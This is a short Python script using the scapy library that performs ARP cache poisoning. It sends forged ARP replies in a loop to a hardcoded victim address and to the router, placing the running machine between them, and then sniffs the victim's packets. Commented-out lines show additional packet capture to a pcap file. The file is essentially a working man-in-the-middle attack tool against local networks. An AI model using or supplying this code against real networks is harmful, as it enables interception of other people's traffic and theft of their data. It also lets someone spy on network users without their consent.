#!/usr/bin/python
# coding: utf-8

from scapy.all import*

def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def ecoute():
	while 1:
		poison('192.168.0.1','192.168.0.107','AC:F1:DF:64:30:FC','24:0A:64:63:BF:65')
		rep =sniff(filter="arp and host 192.168.0.107")
		rep.show()
		time.sleep(1.5)

	#print 'sniffing'
	#pkts = sniff(count=200, lfilter=lambda x: x[1].src=='192.168.0.100', prn=lambda x : x.sprintf("IP Source : %IP.src% ---> IP Destination : %IP.dst%"))
	#pkts = sniff(filter='arp and host 192.168.0.107', count=20)
	#prn=lambda x : x.sprintf("IP Source : %IP.src% ---> IP Destination : %IP.dst%")
	#wrpcap("./write1.pcap", pkts)
	#pkts[1].summary()
	#rep = sniff(filter="arp and host 192.168.0.107", timeout = 200)
	#rep.show()
	#print 'fin sniffing'

ecoute()